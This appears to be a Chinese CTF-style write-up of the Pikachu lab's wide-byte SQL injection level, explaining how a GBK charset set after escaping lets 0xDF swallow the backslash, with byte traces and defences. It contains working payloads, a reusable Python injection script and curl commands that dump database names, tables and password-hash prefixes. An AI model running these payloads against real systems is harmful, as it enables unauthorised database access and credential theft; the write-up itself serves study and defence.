---
layout: post
title: Pikachu - SQL注入 宽字节注入 Writeup（GBK 吃掉反斜杠）
platform: pikachu
date: 2026-10-28 22:49:00 +0800
categories: CTF
---

Pikachu - SQL注入 宽字节注入 Writeup（GBK 吃掉反斜杠）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SQL-Inject → 宽字节注入
- 地址：`http://localhost/pikachu/vul/sqli/sqli_widebyte.php`
- 题型：Web
- 考点：**宽字节注入**、GBK 编码、转义的"字节级"绕过

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu / root / root
```

**页面形态**：

```text
what's your username?

[ 文本框            ]  [ 查询 ]

your uid:3
your email is: kobe@pikachu.com
```

**作者提示**：

```html
data-content="kobe/123456,先搜索下什么是宽字节注入搞懂了在来测试吧"
```

**✅ 实测结果（6 种 payload）**

| # | payload（原始字节）| URL 编码 | 结果 |
|---|---|---|---|
| 1 | `kobe` | `kobe` | 1 条：uid=3 |
| 2 | **`kobe' or 1=1 #`** | `kobe%27%20or%201%3D1%20%23` | **无结果（被转义了）** ✅ 防御生效 |
| 3 | **`\xdf' or 1=1 #`** | `%DF%27%20or%201%3D1%20%23` | **7 条（全部用户）** ✅ **绕过！** |
| 4 | `\xdf' union select 1,2 #` | — | 1 条：`1` \| `2`（2 列）|
| 5 | `\xdf' union select database(),user() #` | — | **`pikachu` \| `root@localhost`** |
| 6 | `\xdf' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #` | — | **`httpinfo,member,message,users,xssblind`** |

**★ 第 2 行和第 3 行的对比，就是本关的全部**：

```
kobe' or 1=1 #        → 失败（' 被转成 \'）
\xdf' or 1=1 #        → 成功（\ 被 GBK 吃掉，' 逃出来了）
```

**PHP 字节级验证**：

```text
原始:   DF 27        （2 字节：0xDF + 单引号）
转义后: DF 5C 27     （3 字节：多了一个 0x5C 反斜杠）

DF 5C 用 GBK 解码 = 運   （一个合法的汉字，2 字节）
★ 反斜杠 0x5C 被"吃掉"了，不再是转义符
★ 剩下的 27 就是裸的单引号
```

二、题目分析

**① 这关"有"转义（和其它关不同）**

```php
<?php
// sqli_widebyte.php 第 26-44 行
if(isset($_POST['submit']) && $_POST['name'] != null){

    $name = escape($link, $_POST['name']);                        // ★ 有转义！
    $query = "select id,email from member where username='$name'";

    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题
    $set = "set character_set_client=gbk";                        // ★ 罪魁祸首
    execute($link, $set);

    //mysqi_query不打印错误描述
    $result = mysqli_query($link, $query);
    if(mysqli_num_rows($result) >= 1){                            // ★ >=1，不是 ==1
        while ($data = mysqli_fetch_assoc($result)){
            $html .= "<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{
        $html .= "<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
?>
```

**★ 和前面几关最大的区别**：

```php
// 前面几关（有漏洞）
$name = $_POST['name'];                 // 零处理 → 直接注入

// 这一关（看起来安全）
$name = escape($link, $_POST['name']);  // ★ 转义了
```

**★ `escape()` 的实现**：

```php
// inc/mysql.inc.php
function escape($link, $data){
    if(is_string($data)){
        return mysqli_real_escape_string($link, $data);   // ★ 标准转义函数
    }
    if(is_array($data)){
        foreach ($data as $key => $val){
            $data[$key] = escape($link, $val);
        }
    }
    return $data;
}
```

**★ `mysqli_real_escape_string` 做了什么**：

```
在每个"危险字符"前加一个反斜杠 \
    '  →  \'
    "  →  \"
    \  →  \\
    NUL → \0
    \n → \n
    \r → \r
    Ctrl-Z → \Z
```

**★ 所以按理说 `'` 被转成 `\'` 就打不了了 —— 实测第 2 行也确实失败了。**

**② 问题出在"编码设置"上**

**看这两行**：

```php
$name = escape($link, $_POST['name']);      // ① 先转义
$query = "select ... where username='$name'";

$set = "set character_set_client=gbk";      // ② 再改字符集
execute($link, $set);
```

**★ 顺序很关键**：

```
① 转义时，连接的字符集是 utf8（connect() 里 mysqli_set_charset($link,'utf8')）
② 转义完才把 character_set_client 改成 gbk

★ 于是：转义时按 utf8 的逻辑加 \
★ 但 SQL 语句到了服务器，服务器按 gbk 来解释这些字节
★ 两边的"解释规则"不一致 → 出了问题
```

**③ 字节级追踪：反斜杠是怎么被"吃掉"的**

**★ 输入**（注意 `\xdf` 是一个**原始字节**，不是两个字符 `%df`）：

```text
输入:  DF 27          （0xDF 这个字节 + 单引号）
```

**★ 经过 `mysqli_real_escape_string`**：

```text
转义后: DF 5C 27      （在 27 前面插入了 5C 反斜杠）
```

**★ 到了 MySQL，服务器按 GBK 解释这 3 个字节**：

```text
GBK 是"变长编码"：
    首字节范围：0x81 ~ 0xFE
    尾字节范围：0x40 ~ 0xFE（除去 0x7F）
    
遇到 DF 5C：
    DF 是合法首字节（0x81~0xFE 范围内）
    5C 是合法尾字节（0x40~0xFE 范围内）
    → 两者组合成一个汉字：DF 5C = "運"
    
剩下: 27  →  裸的单引号！
```

**★ 实测验证**（用 PHP 直接查）**：

```text
DF 5C 用 GBK 解码 = 運
```

**★ 所以**：

```sql
-- 原本想执行的（转义的意图）
select id,email from member where username='kobe\' or 1=1 #'

-- 实际执行的（GBK 吃掉反斜杠后）
select id,email from member where username='kobe運' or 1=1 #'
                                             └──┬──┘└──┬──┘
                                        闭合了引号  注入生效
```

**★ 一句话**：

```
转义符 0x5C 被"当成汉字的后半个字节"消耗掉了
→ 单引号 0x27 重新变成"裸的引号"
→ 转义失效
```

**④ 为什么偏偏是 GBK（而不是 UTF-8）**

**★ UTF-8 的字节结构**：

```
UTF-8 是多字节编码，但：
    首字节：0xC0~0xFD（高位是 11xxxxxx）
    后续字节：0x80~0xBF（高位是 10xxxxxx）
    
★ 0x5C = 01011100，最高位是 0 → 不可能是 UTF-8 的"后续字节"
★ 所以 UTF-8 下，0x5C 永远是独立的反斜杠 → 无法被"吃掉"
```

**★ GBK 的字节结构**：

```
GBK 首字节：0x81~0xFE
GBK 尾字节：0x40~0xFE（★ 包含 ASCII 可打印范围 0x40~0x7E！）

★ 0x5C = 反斜杠，正好在 0x40~0x7E 范围内
★ 所以它可以"当尾字节用" → 被吃掉
```

**★ 这就是"宽字节注入"的本质**：

```
"宽字节" = 用 2 个字节表示一个字符的编码（GBK/BIG5/SJIS）
问题：尾字节允许 ASCII 范围
→ ASCII 里的特殊字符（\ " ' 等）可以被"吃掉"
→ 各种转义函数失效
```

**⑤ 为什么加载顺序很重要**

**★ 如果代码这样写（先设 gbk 再转义）**：

```php
execute($link, "set character_set_client=gbk");     // ① 先设 gbk
$name = escape($link, $_POST['name']);              // ② 再转义
```

**★ 就不会有漏洞**：

```
mysqli_real_escape_string 会读取连接的字符集
如果字符集是 gbk，它会对 0xDF 之后的 0x27 做特殊处理
（在 GBK 下 0xDF 是"半个字符"，转义函数知道要小心）
→ 转义结果会不同 → 无法绕过

★ php 手册明确警告过：
    "The character set must be set either on the server level,
     or in the MySQL API level, to have it affect
     mysqli_real_escape_string()"
```

**★ 本关的问题**：

```
connect() 里设的是 utf8
→ escape() 按 utf8 的规则转义
→ 然后才改成 gbk
→ 转义结果和实际解释不一致

★ 这是"字符集设置顺序"造成的经典漏洞
```

**⑥ `num_rows >= 1`（不是 ==1）

**★ 这一关允许 `or 1=1` 直接返回多行**：

```php
if(mysqli_num_rows($result) >= 1){       // ★ >=1
```

**★ 对比上一关（布尔盲注）**：

```php
if($result && mysqli_num_rows($result)==1){   // ★ ==1（多行会失败）
```

**★ 所以这一关可以痛快地 `or 1=1`（7 条全出来），也可以用 UNION。**

三、解题步骤

**第 1 步：正常查询**

```text
① 打开 http://localhost/pikachu/vul/sqli/sqli_widebyte.php
② 输入框填：kobe
③ 点查询
④ 看到：your uid:3 / your email is: kobe@pikachu.com
```

**★ 提示说 `kobe/123456`，这里只需要用户名 `kobe`。**

**第 2 步：确认"普通引号被防住了"**

**输入**：

```
kobe' or 1=1 #
```

**结果**：`您输入的username不存在`

**★ 为什么**：

```sql
-- 转义后（utf8 视角）
where username='kobe\' or 1=1 #'
                └─┬─┘
            \' 是一个"转义过的引号"，属于字符串内容
            
-- 所以实际在找"用户名叫 kobe' or 1=1 #"的人 → 不存在
```

**★ 防御生效了（在没有 GBK 的前提下）。**

**第 3 步：⭐ 关键一步 —— 怎么输入 `0xDF` 这个字节**

**★ 这是本关最大的操作难点**：

```
⚠️ 不能直接在浏览器输入框里打 "%df"
   → 那会变成 4 个字符：% d f
   → 和 0xDF 这个字节完全不同

⚠️ 也不能输入 "ß"（U+00DF）
   → UTF-8 编码后是 C3 9F（2 字节），不是 DF
```

**★ 三种正确的发送方式**：

**方式 1：用 Python 发原始字节（我用的这个）**

```python
import urllib.request
import urllib.parse

URL = "http://localhost/pikachu/vul/sqli/sqli_widebyte.php"

# ★ 注意这里是 bytes，\xdf 是一个字节
payload = b"\xdf' or 1=1 #"

body = ("name=" + urllib.parse.quote_from_bytes(payload) + "&submit=submit").encode()

req = urllib.request.Request(
    URL, data=body, method="POST",
    headers={"Content-Type": "application/x-www-form-urlencoded"}
)
with urllib.request.urlopen(req) as r:
    print(r.read().decode("utf-8", "replace"))
```

**★ 关键点**：

```
quote_from_bytes(b"\xdf' or 1=1 #")
→ "%DF%27%20or%201%3D1%20%23"
   └┬┘
 %DF 就是 0xDF 这个字节的 URL 编码
```

**方式 2：用 curl（`--data-binary`）**

```powershell
# 先把 payload 写成文件（二进制），再发
# 或者直接用 %DF（curl 会解码）
curl.exe -s "http://localhost/pikachu/vul/sqli/sqli_widebyte.php" `
  --data-binary "name=%DF%27%20or%201%3D1%20%23&submit=submit" `
  -H "Content-Type: application/x-www-form-urlencoded"
```

**★ `--data-binary` 不会对参数做额外处理，`%DF` 会被服务端解码成 0xDF。**

**方式 3：Burp Suite（十六进制编辑）**

```
① 抓 POST 请求
② 在参数里输入（直接打 %df' or 1=1 #）
③ 如果 Burp 把它当文本编码了 → 用 Burp 的 "Hex" 视图改字节
④ Send
```

**第 4 步：⭐ 发起宽字节注入**

**★ 用方式 1 的脚本，payload 换成**：

```python
payload = b"\xdf' or 1=1 #"
```

**★ 预期**：页面显示 **7 条记录**（vince / allen / kobe / grady / kevin / lucy / lili）

**★ 实测确认**：

```
→ 7 条 → 1:vince@pikachu.com | 2:allen@pikachu.com | 3:kobe@pikachu.com ...
```

**第 5 步：UNION 注入（2 列）**

```python
payload = b"\xdf' union select 1,2 #"
```

**★ 结果**：`your uid:1 / your email is: 2`

**第 6 步：读库名和用户**

```python
payload = b"\xdf' union select database(),user() #"
```

**★ 结果**：

```
your uid:pikachu
your email is: root@localhost
```

**第 7 步：读表名**

```python
payload = b"\xdf' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #"
```

**★ 结果**：

```
your uid:httpinfo,member,message,users,xssblind
your email is: 2
```

**第 8 步：完整脚本（可复用）**

```python
# widebyte.py
import re
import urllib.request
import urllib.parse

URL = "http://localhost/pikachu/vul/sqli/sqli_widebyte.php"

def inject(sql):
    """sql 里不要带前导引号，函数会自动加 \xdf' """
    payload = b"\xdf' " + sql.encode() + b" #"
    body = ("name=" + urllib.parse.quote_from_bytes(payload) + "&submit=submit").encode()
    req = urllib.request.Request(
        URL, data=body, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    with urllib.request.urlopen(req, timeout=20) as r:
        html = r.read().decode("utf-8", "replace")
    rows = re.findall(r"your uid:([^<]*)<br />your email is: ([^<]*)</p>", html)
    if rows:
        for uid, email in rows:
            print("   %s | %s" % (uid, email))
    else:
        print("   无结果")

print("① 库名 + 用户")
inject("union select database(),user()")

print("② 表名")
inject("union select group_concat(table_name),2 from information_schema.tables where table_schema=database()")

print("③ users 表账号")
inject("union select group_concat(concat(username,':',substr(password,1,8))),2 from users")
```

**★ 实测输出**：

```text
① 库名 + 用户
   pikachu | root@localhost
② 表名
   httpinfo,member,message,users,xssblind | 2
③ users 表账号
   admin:e10adc39,pikachu:670b1472,test:e99a18c4 | 2
```

**第 9 步：完整 payload 汇总**

```
// 都需要在"原始字节"层面构造（0xDF 是字节，不是两个字符 %df）

\xdf' or 1=1 #
\xdf' union select 1,2 #
\xdf' union select database(),user() #
\xdf' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #
\xdf' union select group_concat(concat(username,':',substr(password,1,8))),2 from users #

// URL 编码形式（curl 用）
%DF%27%20or%201%3D1%20%23
%DF%27%20union%20select%201%2C2%20%23
```

四、延伸知识

**① 宽字节注入的完整条件**

**★ 三个条件同时满足，才会出现宽字节注入**：

```
① 数据库使用"宽字节编码"（GBK / BIG5 / SJIS / GB2312）
   ★ 关键是：尾字节范围包含 ASCII（0x40~0x7E）

② 代码做了转义（addslashes / mysqli_real_escape_string）
   ★ 转义的方式是"加反斜杠 0x5C"

③ 转义时的字符集 ≠ 执行时的字符集（或字符集设置有误）
   ★ 本关：connect 用 utf8 转义，然后 set character_set_client=gbk
```

**★ 缺任何一个都不成立**：

```
· UTF-8 编码 → 0x5C 永远独立，吃不掉
· 没做转义 → 直接注入，不需要宽字节
· 字符集一致 → mysqli_real_escape_string 知道怎么处理
```

**② 哪些编码有这个问题**

| 编码 | 尾字节范围 | 含 ASCII？ | 受影响 |
|---|---|---|---|
| **GBK** | 0x40~0xFE（除 0x7F）| ✅ 是 | ✅ 受影响 |
| **GB2312** | 0xA1~0xFE | ❌ 否 | ❌ 不受影响 |
| **BIG5** | 0x40~0xFE（除 0x7F）| ✅ 是 | ✅ 受影响 |
| **SJIS（日文）** | 0x40~0xFC | ✅ 是 | ✅ 受影响 |
| **UTF-8** | 0x80~0xBF | ❌ 否 | ❌ 不受影响 |
| **UTF-16** | — | — | ❌ 不受影响 |

**★ GBK 和 BIG5 是重灾区**（中文/繁体网站大量使用）。

**★ 一个通用规律**：

```
只要"尾字节范围覆盖了 0x5C（反斜杠）"
→ 就能吃掉转义符
→ 就能宽字节注入
```

**③ 可用的"宽字节前缀"**

**★ 首字节要求**：

```
GBK 合法首字节：0x81 ~ 0xFE
且 0x5C 必须是它的合法尾字节

★ 实测可用的：
    %df  →  D F 5C  = 運   ✅
    %bf  →  B F 5C  = 縗   ✅
    %aa  →  A A 5C  = 猏   ✅
    %81  →  8 1 5C  = 乗   ✅

★ 并不是所有 0x81~0xFE 都行（要看具体尾字节映射表）
★ 但 %df 是最经典的（网上教程都用它）
```

**★ 为什么 `%df` 最常用**：

```
① 0xDF 是合法首字节
② 0xDF 5C 恰好是一个常见汉字"運"
③ 字符集转换时不会出意外（有些字节组合会变成"非法字符"）
```

**④ 历史背景：PHP 的一个经典漏洞**

**★ 2006 年前后，PHP + MySQL + GBK 的组合出过大量漏洞**：

```
当年的"PHP 万能注入"：
    addslashes($_GET['id'])  →  在 GBK 环境下被绕过
    
★ 影响面极大（大量国产 CMS）
★ 后来 PHP 5.4 的 mysqli_set_charset 提供了更安全的接口
★ 但"设置顺序"的坑至今仍然存在
```

**★ PHP 手册的警告（至今有效）**：

```
mysqli_real_escape_string() 的转义效果取决于
"当前连接的字符集"

如果字符集设置得不对（或设置晚了）
→ 转义可能是无效的
```

**⑤ 正确防御（三层）**

**✅ 第一层：预处理（根本解决）**

```php
$stmt = $link->prepare("select id,email from member where username=?");
$stmt->bind_param('s', $_POST['name']);
$stmt->execute();
```

**★ 预处理为什么能防住宽字节注入？**

```
参数值被"按字节"绑定，不参与 SQL 解析
→ 无论 0xDF 后面跟什么，都只是"数据"
→ 没有"引号"这个概念 → 无所谓闭合
```

**✅ 第二层：正确设置字符集（顺序要对）**

```php
// ❌ 错误：先转义再改字符集
$name = escape($link, $_POST['name']);
execute($link, "set character_set_client=gbk");

// ✅ 正确：先用 mysqli_set_charset 统一（在连接时就设好）
$link = mysqli_connect(...);
mysqli_set_charset($link, 'utf8mb4');    // ★ 一开始就设成最终要用的字符集
$name = mysqli_real_escape_string($link, $_POST['name']);
```

**★ 关键原则**：

```
"转义时的字符集" 必须等于 "执行时的字符集"
★ 用 mysqli_set_charset() 而不是 SET NAMES（前者会同时通知客户端库）
```

**✅ 第三层：统一用 UTF-8（消除宽字节编码问题）**

```php
// 全链路统一 UTF-8
mysqli_set_charset($link, 'utf8mb4');      // PHP ↔ MySQL
header('Content-Type: text/html; charset=utf-8');   // 浏览器
// 数据库表也建 utf8mb4
```

**★ 为什么 UTF-8 能根治？**

```
UTF-8 的"后续字节"必须是 10xxxxxx（0x80~0xBF）
0x5C = 01011100 → 最高位是 0 → 不可能被当成后续字节
★ 所以反斜杠在 UTF-8 下永远是独立的转义符
```

**⑥ 一个实用的检测方法**

**★ 做题时怎么快速判断"是不是宽字节注入"？**

```
① 试 ' → 如果页面报错/异常 → 普通注入（不用宽字节）
② 试 ' → 如果页面"正常但没结果" → 可能被转义了
③ 试 %df' → 如果"突然有结果了" → ★ 宽字节注入
```

**★ 本关的实测对比**：

```
kobe' or 1=1 #        → 无结果（被转义）
\xdf' or 1=1 #        → 7 条（绕过成功）
                              └─ 看，加上一个字节就通了
```

**★ 更细的判断**：

```
· 如果 %df 没效果，可以试 %bf、%aa、%a1
· 如果全都不行 → 可能不是 GBK，或者转义函数处理正确了
```

**⑦ 宽字节注入和"字符集"的完整关系图**

```
用户输入  →  PHP 接收（按什么编码解析？）
            ↓
        转义函数（按【当前连接字符集】决定怎么加 \）
            ↓
        拼成 SQL  →  发给 MySQL
            ↓
        MySQL 按【character_set_client】解析字节
            ↓
        如果两者不一致 → 转义失效 → 注入
```

**★ 一句话总结**：

```
宽字节注入 = "字节层面的解释权之争"
    转义函数以为是 1 个字符 + 转义符
    数据库以为是 1 个汉字
★ 谁的解释生效，取决于字符集设置
```

五、总结

- **本题核心：代码做了转义（`mysqli_real_escape_string`），但随后把 `character_set_client` 改成 GBK → 转义符 0x5C 被当成汉字的后半字节"吃掉" → 单引号逃逸。**

- **两行关键代码**：

```php
$name = escape($link, $_POST['name']);          // 先转义（此时字符集是 utf8）
$set = "set character_set_client=gbk";          // ★ 再改成 gbk → 灾难
execute($link, $set);
```

- **字节级过程**：

```text
输入:   DF 27                （0xDF + 单引号）
转义后: DF 5C 27             （插入 0x5C 反斜杠）
GBK 解释: [DF 5C] = 運  +  27（裸单引号）
         └──┬──┘
      反斜杠被吃掉
      
→ 引号逃逸 → SQL 注入成立
```

- **⭐ 七个必记要点**：

```text
① 宽字节注入是"绕过防御"的经典
   前提：宽字节编码（GBK/BIG5）+ 转义 + 字符集不一致

② 根因是"尾字节允许 ASCII"
   GBK 尾字节 0x40~0xFE 包含了 0x5C（反斜杠）
   ★ UTF-8 的后续字节是 0x80~0xBF → 不含 0x5C → 免疫

③ 顺序错误是导火索
   connect 用 utf8 转义 → 再 set character_set_client=gbk
   ★ 转义时的字符集必须等于执行时的字符集

④ payload 里的 0xDF 是"字节"，不是字符
   浏览器输入框打 %df → 变成 4 个字符 % d f（错）
   要用 Python bytes / curl --data-binary / Burp Hex（对）

⑤ 可用前缀：%df / %bf / %aa / %81
   不一定全部都行，要看具体编码映射
   %df 最经典（DF5C = 運）

⑥ 预处理能根治
   参数被按字节绑定，不参与 SQL 解析 → 引号概念消失

⑦ 统一 UTF-8 也能根治
   UTF-8 下 0x5C 永远独立 → 吃不掉
```

- **实测数据**：

```text
kobe                                    → 1 条（uid=3）
kobe' or 1=1 #                          → 无结果（★ 被转义，防御生效）
\xdf' or 1=1 #                          → 7 条（★ 绕过成功）
\xdf' union select 1,2 #                → 1 | 2（2 列）
\xdf' union select database(),user() #  → pikachu | root@localhost
\xdf' union select group_concat(table_name),2 from ... # → 5 张表

PHP 字节级验证：
    mysqli_real_escape_string("\xdf'")  →  DF 5C 27
    convert(0xdf5c using gbk)           →  運
```

- **URL 编码对照**：

```
\xdf' or 1=1 #      →  %DF%27%20or%201%3D1%20%23
\xdf' union select 1,2 #  →  %DF%27%20union%20select%201%2C2%20%23
```

- **SQL-Inject 模块进度：全部完成 🎉 10/10**

```text
✅ 数字型注入(post)       —— UNION
✅ 字符型注入(get)        —— 闭合 '
✅ 搜索型注入             —— 闭合 '%'
✅ xx型注入               —— 闭合 ')'
✅ "insert/update"注入    —— 写操作 + 报错注入
✅ "delete"注入           —— 删数据 + 时间盲注
✅ "http header"注入      —— 请求头 + 数据搬迁
✅ 盲注(base on boolean)  —— 布尔通道 + 二分法
✅ 盲注(base on time)     —— 靠耗时判断
✅ 宽字节注入             —— 本题：GBK 吃掉反斜杠
```

**手工复现要点**：

```text
· 输入 kobe → 看到 uid=3
· 输入 kobe' or 1=1 # → 无结果（被转义）
· 用 Python 发 b"\xdf' or 1=1 #" → 7 条（绕过成功）
· 发 b"\xdf' union select 1,2 #" → 探出 2 列
· 发 b"\xdf' union select database(),user() #" → pikachu / root
· 用 PHP 验证 DF5C 在 GBK 里是"運"
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  宽字节注入 = 转义符被"汉字"吃掉                               │
│                                                            │
│  三个条件：                                                   │
│     ① 宽字节编码（GBK/BIG5，尾字节含 ASCII）                    │
│     ② 做了转义（加 0x5C 反斜杠）                                │
│     ③ 转义时和执行时字符集不一致                                 │
│                                                            │
│  字节级：                                                     │
│     输入 DF 27  →  转义 DF 5C 27  →  GBK 读成 [DF5C]=運 + 27    │
│                                              └ 反斜杠没了      │
│                                                            │
│  ★ payload 的 %df 是【字节】不是字符                            │
│  ★ 根治：预处理，或全链路统一 UTF-8                              │
└────────────────────────────────────────────────────────────┘
```
